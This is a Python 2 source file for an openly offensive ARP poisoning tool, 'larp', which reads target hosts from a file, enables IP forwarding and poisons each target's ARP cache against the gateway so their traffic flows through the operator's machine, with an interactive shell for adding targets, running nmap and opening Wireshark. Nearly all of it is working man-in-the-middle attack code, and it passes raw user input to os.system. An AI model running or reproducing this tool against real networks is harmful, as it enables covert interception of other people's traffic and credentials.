#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script made by papi
#
# Arp poisonning tool used for retreiving data
# provide it a file named host.txt for the hosts he has to arp
# provide it an argument with the gateway ip
# it will arp the entire network to your' machine
# use threading to arp individual clients
# and setup a shell so that when you send an id it stops certain arps
import sys, os
import multiprocessing
import subprocess

import arp

from scapy.all import *
from termcolor import colored

class larp():
    '''-*- larp class -*-
        larp is software made by papi for arp poisonning
    '''

    def __init__(self, gateway_ip, interface, file_name, silent, v=0):
        # setup all of the variables and the configurations
        print colored("[*] Starting up...", "green")    # startup_msg

        # this line had to be commented it threw up interface errors on my system
        #conf.iface = interface                          # interface var
        conf.verb = v                                   # configure verbose mode
        self.interface = interface                      # save interface
        self.silent = silent
        self.g_ip = gateway_ip                          # setup gateway_ip
        self.g_mac = arp.get_mac(self.g_ip)                 # get the gateway mac
        self.t_ip = []                                  # target_ip list
        self.t_mac = dict()                             # map ip -> mac addr
        self.thread_array = []                          # thread array
        self.id_map = dict()
        self.sniffer_proc_id = []                       # variable to control the sniffers
        self.kill = False
        arp.ip_forward()
        print colored("[^] Retreiving ip's", "blue")
        try:                                            # get all of the ip addr's
            with open(file_name, "r") as f:             # open up the target ip file
                temp_ip = f.readlines()                 # get teh ip from the file
                temp_ip = [ x.strip() for x in temp_ip ]
                f.close()                               # remove EOL and close file
            print colored("[*] Retreiving mac addrs", "green")
            print "IP addr -> ",
            print temp_ip
            for ip in temp_ip:
                temp = arp.get_mac(ip)
                if temp == None:
                    print colored("[!] Skipping %s, mac addr is None" % ip, "red")
                elif ip == gateway_ip:
                    print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                else:
                    self.t_ip.append(ip)
                    self.t_mac[ip] = temp               # retrieving mac addrs

        except:
            print colored("[!!] File does not exist", "red")

        print colored("[*] Setup finished!", "green")

    def error(self, msg=""):
        ''' function to display errors '''
        print >> sys.stderr, colored(msg, 'red')
        sys.exit(-1)

    def get_ip_mac(self, buf):
        # id_map[int(buf)][0], id_map[int(buf)][1]
        ip = self.id_map[int(buf)][0]
        mac = self.id_map[int(buf)][1]
        id_no = int(buf)
        return id_no, ip, mac

    def process_cmd(self, t_id, buf):
        if "all" in buf or "a" == buf:
            for i in xrange(0, t_id):
                self.thread_array[i].terminate()
                arp.restore_target(self.g_ip, self.g_mac, self.id_map[i][0], self.id_map[i][1])
                print colored("[^] Restored: %s" % self.id_map[i][0], "blue")
                del self.id_map[i]
            self.kill = True

        elif "list" in buf or "l" == buf:
            for i in xrange(0, t_id):
                print colored("[^] %d => %s / %s" % (i, self.id_map[i][0], self.id_map[i][1]), "blue")
            print colored("[^] no of sniffers: %d" % (len(self.sniffer_proc_id)), "blue")

        elif "nmap" in buf or "n" == buf.split(' ')[0]:
            if buf.split(' ')[0] == 'n':
                i, ip, mac = self.get_ip_mac(buf.split(' ')[1])
                print colored("[^] running nmap on %d => %s" % (i, ip), "blue")
                print colored("[*] Output:", "green")
                os.system("nmap %s" % ip)
            else:
                buffer_array = buf.split(' ')
                l = len(buffer_array)
                print colored("[^] running nmap on %d => %s"\
                   % (int(buffer_array[l-1]), self.id_map[int(buffer_array[l-1])][0]), "blue")
                print colored("[*] Output:", "green")
                os.system("%s %s" % (str(buffer_array[:l-2]), self.id_map[int(buffer_array[l-1])][0]))

        elif "wireshark" in buf or "w" == buf.split(' ')[0]:
            os.system("wireshark &")

        elif "add" in buf:
            ipaddr = buf[buf.find(" ")+1:]
            macaddr = arp.get_mac(ipaddr)
            if ipaddr == self.g_ip:
                print colored("[!!] Ip is gateway skipping...", "red")
            elif macaddr == None:
                print colored("[!!] Mac addr is None skipping...", "red")
            else:
                self.t_ip.append(ipaddr)
                self.t_mac[ipaddr] = macaddr               # retrieving mac addrs
                if not self.silent:
                    self.thread_array.append(multiprocessing.Process(target=arp.poison,\
                            args=(self.g_ip,self.g_mac, ipaddr, macaddr)))
                    self.thread_array[len(self.thread_array)-1].start()
                    self.id_map[len(self.thread_array)-1] =\
                            [ipaddr, macaddr, None, None]
                print colored("[^] Added the ip %s => %s" % (ipaddr, macaddr),\
                        "blue")

        elif "start" in buf and self.silent:
            t_id = 0
            for ip in self.t_ip:                    # start the arp on every client
                self.thread_array.append(multiprocessing.Process(target=arp.poison,\
                args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
                self.thread_array[t_id].start()
                self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
                # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
                t_id += 1

        elif buf.isdigit():
            if len(self.thread_array) > int(buf):
                i, ip, mac = get_ip_mac(buf)
                self.thread_array[i].terminate()
                arp.restore_target(self.g_ip, self.g_mac, ip, mac)
                print colored("[^] Restored: %s" % ip, "blue")

                del id_map[i]
            else:
                print colored("[!] are you trying to break this?!", "red")

        else:
            print colored("[!] Available commands: start - add - all - list - nmap", "red")

    def main(self):
        ''' main function '''
        t_id = 0    # thread id

        print colored("[*] Main Thread", "green")
        print colored("[^] Starting ARP poison", "blue")

        if not self.silent:
            for ip in self.t_ip:                    # start the arp on every client
                self.thread_array.append(multiprocessing.Process(target=arp.poison,\
                args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
                self.thread_array[t_id].start()
                self.id_map[t_id] = [ip, self.t_mac[ip], None , None]
                # id_mapper  ip |  mac addr |  if sniffing|if in img harvest
                t_id += 1

        print self.id_map
        print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")

        while not self.kill:
            buf = raw_input('#> ')               # display the prompt
            self.process_cmd(t_id, buf)               # process the command
            t_id = len(self.t_ip)

        for thread in self.thread_array:
            thread.join()

